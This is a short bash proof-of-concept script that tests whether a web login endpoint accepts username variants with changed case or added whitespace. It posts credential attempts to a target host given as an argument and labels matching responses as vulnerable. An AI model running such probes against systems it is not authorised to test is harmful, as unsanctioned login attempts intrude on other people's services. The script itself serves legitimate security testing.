#!/bin/bash

# POC: Improper Username Input Normalization - Version 2
# Demonstrates that login endpoint accepts usernames with case variations
# and trailing/leading whitespace without proper normalization

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-80}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=== Username Input Normalization Vulnerability POC ==="
echo "Target: $TARGET_URL"
echo ""

# First, let's try to understand the application structure
echo "[INFO] Testing endpoint structure..."
curl -s -o /dev/null -w "GET /login: %{http_code}\n" "$TARGET_URL/login"
curl -s -o /dev/null -w "GET /: %{http_code}\n" "$TARGET_URL/"
echo ""

# Try POST with form-encoded data
echo "[TEST 1] POST to /login with normal username"
RESPONSE1=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" \
  2>/dev/null)
BODY1=$(echo "$RESPONSE1" | head -n -1)
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
echo "HTTP Status: $HTTP_CODE1"
if echo "$BODY1" | grep -q "redirect\|302\|success\|dashboard"; then
  echo "Response suggests success"
fi
echo ""

# Try with trailing space in URL-encoded format
echo "[TEST 2] POST with trailing space 'test ' (URL encoded)"
RESPONSE2=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test%20&password=test" \
  2>/dev/null)
BODY2=$(echo "$RESPONSE2" | head -n -1)
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
echo "HTTP Status: $HTTP_CODE2"
if echo "$BODY2" | grep -q "redirect\|302\|success\|dashboard"; then
  echo "Response suggests success - VULNERABLE: Trailing space accepted"
fi
echo ""

# Try uppercase
echo "[TEST 3] POST with uppercase 'TEST'"
RESPONSE3=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=TEST&password=test" \
  2>/dev/null)
BODY3=$(echo "$RESPONSE3" | head -n -1)
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)
echo "HTTP Status: $HTTP_CODE3"
if echo "$BODY3" | grep -q "redirect\|302\|success\|dashboard"; then
  echo "Response suggests success - VULNERABLE: Uppercase accepted"
fi
echo ""

# Try mixed case
echo "[TEST 4] POST with mixed case 'TeSt'"
RESPONSE4=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=TeSt&password=test" \
  2>/dev/null)
BODY4=$(echo "$RESPONSE4" | head -n -1)
HTTP_CODE4=$(echo "$RESPONSE4" | tail -n1)
echo "HTTP Status: $HTTP_CODE4"
if echo "$BODY4" | grep -q "redirect\|302\|success\|dashboard"; then
  echo "Response suggests success - VULNERABLE: Mixed case accepted"
fi
echo ""

# Try with both leading and trailing spaces
echo "[TEST 5] POST with spaces '  test  ' (leading and trailing)"
RESPONSE5=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=%20%20test%20%20&password=test" \
  2>/dev/null)
BODY5=$(echo "$RESPONSE5" | head -n -1)
HTTP_CODE5=$(echo "$RESPONSE5" | tail -n1)
echo "HTTP Status: $HTTP_CODE5"
if echo "$BODY5" | grep -q "redirect\|302\|success\|dashboard"; then
  echo "Response suggests success - VULNERABLE: Extra spaces accepted"
fi
echo ""

echo "=== ANALYSIS ==="
echo "Compare HTTP status codes and responses above."
echo "If tests with case variations or spaces show same success as normal username,"
echo "the application is NOT normalizing input properly."